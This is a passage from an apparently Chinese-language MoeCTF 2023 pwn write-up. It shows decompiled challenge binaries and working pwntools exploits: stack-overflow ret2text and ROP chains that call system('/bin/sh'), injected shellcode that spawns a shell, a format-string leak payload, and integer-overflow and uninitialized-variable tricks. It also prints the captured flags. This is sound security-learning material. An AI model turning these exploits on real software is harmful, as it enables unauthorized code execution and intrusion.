  <span class="token keyword">int</span> input<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-6Ch] BYREF</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-68h]</span>
  <span class="token keyword">int</span> new_fd<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-64h]</span>
  <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-60h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]</span>

  v8 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  input <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do you know fd?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"./flag"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  new_fd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> fd<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x29A</span><span class="token punctuation">;</span>
  <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> new_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which file do you want to read?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input its fd: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;3H1lDl8GIZHEi0_IWpA4krCAChNI3bpd&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/">https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/</a></p>
<p>int32溢出的原理是进位的时候把最高位的正负符号位改变了，所以变成负数了。</p>
<p>所以要计算变成-114514，要明白 i32的大小范围 2**31 -1。-1是因为有个0</p>
<p>所以只需要计算2**32 - 114514 就能求出溢出到-114514需要输入多少，得到4294852782</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> n<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to Moectf2023."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do you know int overflow?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Can you make n == -114514 but no '-' when you input n."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input n:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> n <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">114514</span> <span class="token punctuation">)</span>
    <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Maybe you should search and learn it."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;6iD1QTUJSScIKT-_6vm-6nWQs8GvJK6-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text_32"></a>ret2text_32</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">size_t</span> nbytes<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-5Ch] BYREF</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">84</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-58h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to my stack in MoeCTF2023!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What's your age?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Now..try to overflow!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序里面有plt system的，有个&#x2F;bin&#x2F;sh的gadget<br>这里只需要计算buf到返回地址的距离，system填充栈底下的返回地址，然后填充system的返回地址还有&#x2F;bin&#x2F;sh的地址，就能将&#x2F;bin&#x2F;sh传参到system</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

ip <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
port <span class="token operator">=</span> <span class="token number">58873</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
<span class="token comment"># p = process("./pwn")</span>


line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># Welcome to my stack in MoeCTF2023!</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># What's your age?</span>


system_addr <span class="token operator">=</span> <span class="token number">0x8049070</span> <span class="token comment"># plt func system</span>
command_addr <span class="token operator">=</span> <span class="token number">0x804c02c</span> <span class="token comment"># /bin/sh addr</span>

<span class="token comment"># offset = char buf[84] + var_4 4 byte = s ; s + 4 = r</span>
payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">84</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">b'C'</span> <span class="token operator">*</span> <span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>command_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># What's your age?</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;eV9akrlQlwtJVvpBAk45YMO18UHvBv4n&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text_64"></a>ret2text_64</h2><p>咱是笨蛋，因为64位栈对齐想了好久 <a target="_blank" rel="noopener" href="https://blog.csdn.net/hu_c_t_f/article/details/131902515">https://blog.csdn.net/hu_c_t_f/article/details/131902515</a></p>
<p>64位使用rdi传第一个参数 传参的顺序分别是rdi rsi rdx rcx r8 r9，所以需要找一个pop rdi ret的gadget</p>
<p>使用ROPgadget –binary pwn | grep pop | grep rdi 就能筛选</p>
<p>offset + ret + gadget + &#x2F;bin&#x2F;sh + func system()</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

ip <span class="token operator">=</span> <span class="token string">"localhost"</span>
port <span class="token operator">=</span> <span class="token number">50215</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
<span class="token comment"># p = process("./pwn")</span>

line <span class="token operator">=</span>  p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
line <span class="token operator">=</span>  p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
line <span class="token operator">=</span>  p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>

string_addr <span class="token operator">=</span> <span class="token number">0x404050</span> <span class="token comment"># bin/sh address</span>
gadget_addr <span class="token operator">=</span> <span class="token number">0x4011be</span>   <span class="token comment"># pop rdi ret</span>
system_addr <span class="token operator">=</span> <span class="token number">0x401090</span> <span class="token comment"># system(char * command) address</span>
ret_addr <span class="token operator">=</span> <span class="token number">0x040101a</span> <span class="token comment"># ret addr</span>


payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># offset buf[80] + 8 = r</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token comment">#64位 gadget中有个ret 消耗了8字节，这里需要再ret一次保持栈对齐</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>gadget_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>string_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

line <span class="token operator">=</span>  p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;KsAymn0LqrzuRUcO3QI71N_u3UzZz1m7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="shellcode-level0"><a href="#shellcode-level0" class="headerlink" title="shellcode_level0"></a>shellcode_level0</h2><p>这里的意思是，我传进去的数据会先放到rbp+var_70的位置，然后下面会call我传进去的数据，查询了一下然后根据题目的提示，我只需要用pwntools中的shellcraft来生成shellcode然后sendline过去就好了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">lea     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_70<span class="token punctuation">]</span>
mov     rdi<span class="token punctuation">,</span> rax
mov     eax<span class="token punctuation">,</span> <span class="token number">0</span>
call    _gets
lea     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_70<span class="token punctuation">]</span>
mov     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_78<span class="token punctuation">]</span><span class="token punctuation">,</span> rax
mov     rdx<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_78<span class="token punctuation">]</span>
mov     eax<span class="token punctuation">,</span> <span class="token number">0</span>
call    rdx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

ip <span class="token operator">=</span> <span class="token string">"192.168.1.111"</span>
port <span class="token operator">=</span> <span class="token number">58988</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
<span class="token comment"># p = process("./shellcode_level0")</span>

shellcode  <span class="token operator">=</span>  asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> shellcode

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里要先设置一下context函数，设置好平台再生成shellcode sendline过去</p>
<pre class="line-numbers language-none"><code class="language-none">moectf&#123;ddP0bHRsw_l0B6HQnDFtG62TOXAVXFv6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h2><p>mmap和mprotect函数是干嘛用的？我的shellcode怎么没有执行权限？</p>
<p>mmap是类似于malloc但是可以指定内存的读写执行权限是怎么样的，然后mprotect是在已经分配好的内存上面修改内存的权限</p>
<p>在case4里面7的意思是PROT_READ | PROT_WRITE | PROT_EXEC 的结果，可读可写可执行</p>
<pre class="line-numbers language-none"><code class="language-none">int mprotect(void *addr, size_t len, int prot);
mprotect(paper4, 0x1000uLL, 7);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后只需要case4 shellcode就没问题了，pwntools脚本是这样写的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> posixpath
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


ip <span class="token operator">=</span> <span class="token string">"192.168.129.194"</span>
port <span class="token operator">=</span> <span class="token number">57941</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
<span class="token comment"># p = process("./shellcode_level1")</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>

line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># Which paper will you choose?</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">)</span> <span class="token comment"># mprotect(paper4, 0x1000uLL, 7);</span>

line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># what do you want to write?</span>

shellcode  <span class="token operator">=</span>  asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> payload <span class="token operator">=</span> shellcode
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="uninitialized-key"><a href="#uninitialized-key" class="headerlink" title="uninitialized_key"></a>uninitialized_key</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  age <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input your age:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your age is %d.\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> key<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input your key:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%5d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> key <span class="token operator">==</span> <span class="token number">114514</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This is my flag."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>key和age在栈中的地址一样的，所以只需要在get_name中设置age变量为114514，然后scanf这里输入一个非数字的符号，就不会初始化，比如说&#x3D;号</p>
<pre class="line-numbers language-none"><code class="language-none">moectf&#123;V5glae83rq6G1nSbZa6pGtWaflnHjE1U&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-B0h]</span>
  <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-ACh] BYREF</span>
  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp-5Ch] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+A4h] [ebp-Ch]</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>p_argc<span class="token punctuation">;</span> <span class="token comment">// [esp+A8h] [ebp-8h]</span>

  p_argc <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"open flag error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> <span class="token number">0x50u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token number">0x50u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your name is: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>搜索后发现 printf(name)这里存在格式化字符串漏洞，可以用%x来泄露栈上的数据，没有加参数列表似乎是从栈起始地址开始读，%x是以16进制输出数据，32位是4字节。</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>linux上是小端序存储，所以需要反转一下变成大端序显示</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">"ff886d4c.50.56648362.ff886e74.0.3.63656f6d.617b6674.4c4c5059.67426344.6e577272.70453348.484b5041.784f3151.64774731.7d515737.a.0.0.0.0.0.0.0.0.0.252e7825"</span>
flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">convert</span><span class="token punctuation">(</span>segment<span class="token punctuation">)</span><span class="token punctuation">:</span>
